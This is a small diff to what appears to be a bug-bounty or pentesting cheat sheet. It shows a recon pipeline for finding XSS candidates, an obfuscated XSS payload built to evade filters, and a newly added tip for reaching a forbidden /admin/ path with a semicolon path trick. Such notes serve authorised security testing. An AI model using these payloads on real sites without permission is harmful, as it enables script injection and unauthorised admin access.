@@ -108,5 +108,7 @@ cat target.txt | waybackurls | gf xss | kxss
 ```js
 <x/onpointerRawupdate=confirm%26Ipar;1)//x
 ```
-
+## Bypass Admin Location
+1. If GET /admin/ is 403
+2. Try this GET /admin;/
 
